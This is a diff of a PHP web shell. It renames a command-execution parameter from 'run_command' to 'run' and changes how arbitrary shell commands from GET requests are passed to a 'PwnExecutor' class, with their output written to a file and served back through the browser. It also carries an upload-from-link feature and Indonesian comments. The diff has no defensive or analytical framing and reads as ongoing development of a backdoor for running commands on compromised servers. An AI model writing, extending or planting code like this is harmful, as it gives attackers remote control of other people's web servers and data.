@@ -659,7 +659,6 @@ Upload File From Link :<br>
     echo "</center>";
 } elseif (isset($_GET['komendv2'])) {
     $current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
-    $output_file = __DIR__ . '/output.txt';
     echo "<center>";
     echo '<form method="get" action="" onsubmit="return false;" id="pwnForm">
             <input type="hidden" name="path" value="'.htmlspecialchars($current_path).'">
@@ -675,7 +674,7 @@ Upload File From Link :<br>
                 if(!cmd) return;
                 var path = document.getElementById("pwnForm").querySelector("input[name=path]").value;
                 var xhr = new XMLHttpRequest();
-                xhr.open("GET", "?run_command=" + encodeURIComponent(cmd) + "&path=" + encodeURIComponent(path), true);
+                xhr.open("GET", "?run=" + encodeURIComponent(cmd) + "&path=" + encodeURIComponent(path), true);
                 xhr.onload = function() {
                     document.getElementById("pwnResult").src = "?show_output=1&path=" + encodeURIComponent(path) + "&t=" + new Date().getTime();
                 };
@@ -683,16 +682,16 @@ Upload File From Link :<br>
             }
           </script>';
     echo "</center>";
-    // Biarkan tanpa exit agar tetap menampilkan file list di bawah (opsional)
-} elseif (isset($_GET['run_command'])) {
-    $cmd = $_GET['run_command'];
+} elseif (isset($_GET['run'])) {
+    $cmd = $_GET['run'];
     $workdir = isset($_GET['path']) ? $_GET['path'] : null;
     if ($workdir && is_dir($workdir)) {
         chdir($workdir);
     }
-    $output_file = __DIR__ . '/output.txt';
-    $full_cmd = "({$cmd}) > " . escapeshellarg($output_file) . " 2>&1";
-    new PwnExecutor($full_cmd);
+    $full_cmd = "({$cmd}) > output.txt";
+    new PwnExecutor($full_cmd); // pastikan class PwnExecutor sudah didefinisikan
+    $url = strtok($_SERVER['REQUEST_URI'], '?');
+    header("Location: " . $url);
     exit;
 } elseif (isset($_GET['show_output'])) {
     $output_file = __DIR__ . '/output.txt';
@@ -700,7 +699,7 @@ Upload File From Link :<br>
         header('Content-Type: text/plain; charset=utf-8');
         readfile($output_file);
     } else {
-        echo "No output yet. Jalankan perintah terlebih dahulu.";
+        echo "No output yet.";
     }
     exit;
 }
